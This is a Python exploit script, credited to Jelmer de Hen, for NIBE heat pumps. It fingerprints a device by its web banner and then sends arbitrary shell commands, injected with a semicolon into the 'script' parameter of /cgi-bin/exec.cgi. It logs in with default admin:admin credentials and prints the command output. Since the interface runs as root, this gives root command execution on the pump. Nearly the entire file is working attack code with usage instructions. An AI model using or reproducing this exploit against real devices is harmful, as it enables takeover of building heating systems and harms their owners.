#!/usr/bin/python
import socket,sys,os,base64
# NIBE heat pump RCE exploit
#
# Written by Jelmer de Hen
# Published at http://h.ackack.net/?p=302
#
# Web interface is running with root rights
#


def finger_heatpump(ip, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	s.send("GET / HTTP/1.1\n\n")
	header = s.recv(1024)
	s.close()
	if header.find("NIBE") !=-1:
		return 1
	else:
		return 0

def exploit_pump(ip, port, command, basic_auth):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip, port))
	s.send("GET /cgi-bin/exec.cgi?script=;%20"+command+" HTTP/1.1\nAuthorization: Basic "+basic_auth+"\n\n")
	cmd_result = ""
	while s.recv(1024):
		cmd_result = cmd_result + s.recv(1024)
	s.close()
	return cmd_result

def instructions():
	print sys.argv[0]+" [ip] [port] [filename] [username (default=admin)] [password (default=admin)]"
	print "Written by Jelmer de Hen"
	print "published at http://h.ackack.net/?p=302"
	print "Examples (for spaces in commands use %20 instead of \"\x20\"):"
	print sys.argv[0]+" 127.0.0.1 80 \"ls%20-al\""
	sys.exit(1)

def main():
	if len(sys.argv)==4 or len(sys.argv)==6:
		try:
			ip = sys.argv[1]
			port = int(sys.argv[2])
			command = sys.argv[3]
		except:
			instructions()
		try:
			basic_auth = base64.b64encode(sys.argv[4]+":"+sys.argv[5])
		except:
			basic_auth = base64.b64encode("admin:admin")

		if finger_heatpump(ip, port) == 1:
			print "[+] Fingerprint scan success"
			command_result = exploit_pump(ip, port, command, basic_auth)
			if len(command_result)==0:
				print "[-] The exploit failed, you can retry the exploit or the username and/or password are not right"
			else:
				print "[+] Contents of "+command_result+":"
				print command_result
		else:
			print "[-] Fingerprint scan failed"

	else:
		instructions()

if __name__ == "__main__":
	sys.exit(main())